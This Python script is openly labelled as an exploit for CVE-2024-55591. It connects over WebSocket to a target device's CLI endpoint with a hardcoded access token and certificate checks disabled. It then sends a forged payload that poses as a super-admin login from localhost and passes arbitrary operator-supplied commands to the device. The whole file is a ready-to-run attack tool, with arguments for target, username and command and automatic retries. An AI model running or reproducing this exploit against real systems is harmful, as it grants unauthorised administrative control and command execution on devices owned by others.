import asyncio
import websockets
import ssl
import argparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

DEFAULT_EXPLOIT_PAYLOAD_TEMPLATE = "\"{username}\" \"admin\" \"root\" \"super_admin\" \"root\" \"none\" [127.0.0.1]:1337 [127.0.0.1]:1337\n"
LOCAL_ACCESS_TOKEN = "GIANTYELLOWDUCK"
RECEIVE_TIMEOUT = 0.3  # Timeout in seconds for receiving data


async def raw_receive(websocket, debug):
    """
    Reads raw WebSocket messages and returns the data as bytes.
    Debug mode outputs the raw frame content.
    """
    try:
        raw_data = await asyncio.wait_for(websocket.recv(), timeout=RECEIVE_TIMEOUT)
        if debug:
            if isinstance(raw_data, bytes):
                print(f"{Fore.YELLOW}[DEBUG] Raw data received (hex): {raw_data.hex()}")
            elif isinstance(raw_data, str):
                print(f"{Fore.YELLOW}[DEBUG] Raw data received (text): {raw_data}")
        return raw_data
    except asyncio.TimeoutError:
        print(f"{Fore.YELLOW}[WARNING] Timeout while waiting for data.")
        return None
    except websockets.WebSocketException as e:
        print(f"{Fore.RED}[ERROR] WebSocket error during receiving: {e}")
        raise RuntimeError(f"WebSocket error: {e}")


async def receive_complete_message(websocket, debug):
    """
    Receives multiple frames and reconstructs the full message.
    Returns the complete message as bytes.
    """
    full_message = b""  # Buffer to store full message
    while True:
        try:
            raw_data = await raw_receive(websocket, debug)
            if raw_data is None:
                break
            if isinstance(raw_data, bytes):
                full_message += raw_data  # Add received data to buffer
            else:
                break  # Exit if unexpected data is received
        except websockets.WebSocketException as e:
            print(f"{Fore.RED}[ERROR] WebSocket error during message receiving: {e}")
            raise RuntimeError(f"WebSocket error: {e}")
    return full_message


async def send_payload(websocket, payload, debug):
    """
    Sends a payload to the WebSocket server and processes the response.
    Outputs the response in human-readable format and optionally in hex (DEBUG).
    """
    try:
        await websocket.send(payload)
        print(f"{Fore.GREEN}[INFO] Sent payload: {payload.strip()}.")

        # Wait for the complete response after sending the payload
        response = await receive_complete_message(websocket, debug)

        # Always display the response in decoded format
        try:
            decoded_response = response.decode("utf-8", errors="ignore")
            print(f"{Fore.GREEN}[INFO] Decoded response:")
            print(f"{Style.BRIGHT}{'='*40}\n{decoded_response}\n{'='*40}")
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to decode response: {e}")

        # In DEBUG mode, show raw HEX output for deeper analysis
        if debug:
            print(f"{Fore.YELLOW}[DEBUG] Full response (hex): {response.hex()}")
    except websockets.WebSocketException as e:
        print(f"{Fore.RED}[ERROR] WebSocket error during sending payload: {e}")
        raise RuntimeError(f"WebSocket error: {e}")


async def main(target, port, command, username, debug):
    """
    Main logic for WebSocket communication.
    """
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    # Prepare the exploit payload with the provided username
    exploit_payload = DEFAULT_EXPLOIT_PAYLOAD_TEMPLATE.format(username=username)

    path = f"wss://{target}:{port}/ws/cli/?local_access_token={LOCAL_ACCESS_TOKEN}"

    try:
        async with websockets.connect(path, ssl=ssl_context) as websocket:
            print(f"{Fore.GREEN}[INFO] WebSocket connection established")

            # Send exploit payload and wait for response
            await send_payload(websocket, exploit_payload, debug)

            # Append \n to the command and send
            await send_payload(websocket, command + "\n", debug)

    except websockets.WebSocketException as e:
        print(f"{Fore.YELLOW}[WARNING] Retrying due to WebSocket error: {e}")
        return False  # Signal to retry
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")
        return False
    return True  # Signal success


async def retrying_main(target, port, command, username, debug):
    """
    Wrapper for main logic with automatic retries on specific errors.
    """
    while True:
        success = await main(target, port, command, username, debug)
        if success:
            break
        print(f"{Fore.YELLOW}[WARNING] Reconnecting...")
        await asyncio.sleep(0.5)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2024-55591 exploit by https://github.com/virus-or-not/")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=443, help="Target port (default: 443)")
    parser.add_argument("--username", required=True, help="Admin account username")
    parser.add_argument("--command", required=True, help="Command to execute (tip: you could specify multiple commands separated by \\n)")
    parser.add_argument("--debug", action="store_true", default=False, help="Enable debug mode (default: False)")

    args = parser.parse_args()

    # Run the retrying_main function with parsed arguments
    asyncio.run(retrying_main(args.target, args.port, args.command, args.username, args.debug))
